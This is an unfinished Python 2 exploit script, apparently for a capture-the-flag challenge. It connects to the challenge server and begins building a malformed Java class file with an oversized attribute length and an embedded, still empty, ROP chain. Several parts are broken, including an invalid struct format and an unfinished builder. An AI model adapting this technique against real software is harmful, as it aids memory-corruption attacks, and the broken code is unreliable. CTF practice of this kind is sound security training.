__author__ = 'HuyNA'

import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

'''
address: classy.9447.plumbing
port: 9447
'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "classy.9447.plumbing"
local_host="192.168.248.172"
port = 9447
s.connect((host, port))
#s.connect((local_host, port))
rop = [

]


def MethodCountEntry(name, descriptor, attribute_length=0xF4230):
    AccessFlag      =struct.pack('>w',1)        # access_flags == 1 || access_flags == 9
    NameIndex       =struct.pack('>w',name) #?
    DescriptorIndex =struct.pack('>w',descriptor)
    AttributesCount =struct.pack('>w',1)        # attr_count == 1

    # Attribute Count Entry
    AttributesNameIndex = struct.pack('>w',1)   # index tro den string "Code"
    AttributesLength    = struct.pack('>I',attribute_length)    # <0xF4240

    # UserDefinedFunction::UserDefinedFunction
    UserDefinedFunction = ''
    Word1=struct.pack('>h',1)       #max_stack
    Word2=struct.pack('>h',1)       #max_locals
    Char4='huyna'
    DWORD3=struct.pack('>i',len(Char4))
    Word5=struct.pack('>h',0)
    Word6=struct.pack('>h',1)
    #
    Index1  =struct.pack('>h',1)
    Size2   =struct.pack('>i',len(rop))
    Char3   =rop
    UserDefinedFunction = Word1+Word2+DWORD3+Char4+Word5+Word6+Index1+Size2+Char3

    MethodCountEntr = AccessFlag+NameIndex+DescriptorIndex+AttributesCount+AttributesNameIndex+AttributesLength+UserDefinedFunction

    return MethodCountEntr

def create_utf8_ref(size, data):
    utf8_Ref = struct.pack('>h',1)

def build_file():
    signatue =  0xCAFEBABE
    version = 'huyn'            # tuy y - khong su dung
    #Create constant pool count
    ConstantPoolCount = 10
    for i in xrange(ConstantPoolCount):
        print 1

    # Access Flag - 2bytes
    AccessFlag = 0x21           # bat buoc

    # This Class - 2bytes
    ThisClass = 1
    # Super Class - 2bytes - java/lang/Object
    SuperClass = 1
    # InterfaceCount - 2bytes
    InterfaceCount = 0
    # FieldsCount - 2bytes
    FieldsCount = 0
    # MethodCount - 2bytes
    MethodCount = 2

